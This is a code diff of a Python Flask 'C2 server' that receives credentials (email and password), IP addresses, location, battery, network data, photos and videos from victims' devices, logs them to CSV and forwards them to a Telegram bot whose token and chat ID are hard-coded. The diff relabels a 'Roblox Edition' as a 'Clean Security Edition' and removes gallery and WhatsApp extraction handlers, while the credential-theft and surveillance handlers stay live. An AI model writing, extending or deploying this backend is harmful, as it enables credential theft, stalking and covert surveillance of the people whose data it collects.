@@ -4,7 +4,6 @@ import json
 import base64
 import os
 import csv
-import re
 from datetime import datetime
 
 app = Flask(__name__)
@@ -16,11 +15,9 @@ TELEGRAM_TOKEN = "8440979863:AAE8OS_UzuvJV6T-sEqC9PuO0TvNUNapur8"
 TELEGRAM_CHAT_ID = "8204622013"
 # ============================================================
 
-# Create folders (for temporary storage)
+# Create folders for temporary storage
 os.makedirs("photos", exist_ok=True)
 os.makedirs("videos", exist_ok=True)
-os.makedirs("audio", exist_ok=True)
-os.makedirs("gallery", exist_ok=True)
 os.makedirs("logs", exist_ok=True)
 
 # Credentials log
@@ -28,7 +25,7 @@ CREDENTIAL_CSV = os.path.join("logs", "credentials.csv")
 if not os.path.exists(CREDENTIAL_CSV):
     with open(CREDENTIAL_CSV, 'w', newline='', encoding='utf-8') as f:
         writer = csv.writer(f)
-        writer.writerow(['timestamp', 'roblox_id', 'password', 'ip'])
+        writer.writerow(['timestamp', 'email', 'password', 'ip'])
 
 # Location log
 LOCATION_CSV = os.path.join("logs", "locations.csv")
@@ -119,26 +116,25 @@ def exfil():
         print(f"[+] Data: {data_type} from {ip}")
         
         # ============================================================
-        # 1. CREDENTIALS — Roblox Edition
+        # 1. CREDENTIALS
         # ============================================================
         if data_type == 'credentials':
-            roblox_id = data.get('roblox_id', data.get('email', ''))
+            email = data.get('email', '')
             password = data.get('pass', '')
             user_agent = data.get('userAgent', '')
             
             with open(CREDENTIAL_CSV, 'a', newline='', encoding='utf-8') as f:
                 writer = csv.writer(f)
-                writer.writerow([data['timestamp'], roblox_id, password, ip])
+                writer.writerow([data['timestamp'], email, password, ip])
             
-            msg = f"🎮 <b>Roblox Credentials</b>\n"
-            msg += f"🆔 ID: <code>{roblox_id}</code>\n"
-            msg += f"🔑 Pass: <code>{password}</code>\n"
+            msg = f"🔐 <b>Credentials</b>\n"
+            msg += f"📧 Email: <code>{email}</code>\n"
+            msg += f"🔑 Password: <code>{password}</code>\n"
             msg += f"🌐 IP: {ip}\n"
-            msg += f"📱 UA: {user_agent[:80]}\n"
             msg += f"🕐 Time: {data['timestamp']}"
             
             send_telegram(msg)
-            print(f"[✓] Roblox credentials: {roblox_id}")
+            print(f"[✓] Credentials: {email}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
@@ -218,39 +214,7 @@ def exfil():
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 7. GALLERY FILE
-        # ============================================================
-        if data_type == 'media_file':
-            filename = data.get('filename', 'unknown')
-            filepath = data.get('path', '')
-            raw = data.get('data', '')
-            if raw:
-                safe_name = f"gallery/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)}"
-                with open(safe_name, 'wb') as f:
-                    f.write(base64.b64decode(raw))
-                send_file_to_telegram(safe_name, f"📁 <b>Gallery File</b>\n📄 {filename}\n📂 {filepath}")
-                os.remove(safe_name)
-                print(f"[✓] Gallery file forwarded: {filename}")
-            return jsonify({"status": "OK"}), 200
-        
-        # ============================================================
-        # 8. GALLERY EXTRACTION COMPLETE
-        # ============================================================
-        if data_type == 'media_extraction_complete':
-            count = data.get('count', 0)
-            send_telegram(f"✅ Gallery extraction complete: {count} files")
-            return jsonify({"status": "OK"}), 200
-        
-        # ============================================================
-        # 9. GALLERY EXTRACTION ERROR
-        # ============================================================
-        if data_type == 'media_extraction_error':
-            error = data.get('error', 'unknown')
-            send_telegram(f"❌ Gallery extraction error: {error}")
-            return jsonify({"status": "OK"}), 200
-        
-        # ============================================================
-        # 10. MEDIA ERROR
+        # 7. MEDIA ERROR
         # ============================================================
         if data_type == 'media_error':
             error = data.get('error', 'unknown')
@@ -258,15 +222,7 @@ def exfil():
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 11. TEST
-        # ============================================================
-        if data_type == 'test':
-            msg = data.get('message', 'No message')
-            send_telegram(f"🧪 Test message: {msg}")
-            return jsonify({"status": "OK", "message": "Test received"}), 200
-        
-        # ============================================================
-        # 12. ACTION
+        # 8. ACTION (install clicked, etc.)
         # ============================================================
         if data_type == 'action':
             action = data.get('action', 'unknown')
@@ -274,23 +230,15 @@ def exfil():
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 13. WHATSAPP (removed, but kept for compatibility)
+        # 9. TEST
         # ============================================================
-        if data_type == 'whatsapp_extraction_complete':
-            send_telegram("✅ WhatsApp extraction complete")
-            return jsonify({"status": "OK"}), 200
-        
-        if data_type == 'whatsapp_extraction_error':
-            error = data.get('error', 'unknown')
-            send_telegram(f"❌ WhatsApp extraction error: {error}")
-            return jsonify({"status": "OK"}), 200
-        
-        if data_type == 'whatsapp_database' or data_type == 'whatsapp_media' or data_type == 'whatsapp_cache':
-            print(f"[!] WhatsApp data received but WhatsApp extraction is disabled.")
-            return jsonify({"status": "OK"}), 200
+        if data_type == 'test':
+            msg = data.get('message', 'No message')
+            send_telegram(f"🧪 Test message: {msg}")
+            return jsonify({"status": "OK", "message": "Test received"}), 200
         
         # ============================================================
-        # 14. DEFAULT
+        # 10. DEFAULT
         # ============================================================
         send_telegram(f"📨 <b>Data</b>\n<pre>{json.dumps(data, indent=2)[:2000]}</pre>")
         return jsonify({"status": "OK"}), 200
@@ -317,16 +265,15 @@ def ping():
 def home():
     return jsonify({
         "status": "C2 Server Running",
-        "version": "3.1",
+        "version": "4.0",
         "endpoints": ["/ping", "/exfil"],
         "features": [
-            "roblox_credentials",
+            "credentials",
             "location",
             "battery",
             "network",
             "photo",
-            "video",
-            "gallery"
+            "video"
         ]
     }), 200
 
@@ -336,13 +283,14 @@ def home():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     print("=" * 60)
-    print("  🚀 C2 SERVER v3.1 - ROBLOX EDITION")
+    print("  🚀 C2 SERVER v4.0 - CLEAN SECURITY EDITION")
     print("=" * 60)
     print("  ✅ CORS enabled for all origins")
     print("  ✅ Telegram forwarding active")
-    print("  ✅ Roblox credentials supported")
-    print("  ✅ Gallery extraction supported")
-    print("  ✅ All files sent to Telegram")
+    print("  ✅ Credentials logging active")
+    print("  ✅ Location tracking active")
+    print("  ✅ Photo forwarding active")
+    print("  ✅ Video forwarding active")
     print(f"  ✅ Listening on: http://0.0.0.0:{port}")
     print("=" * 60)
     app.run(host="0.0.0.0", port=port, debug=False)
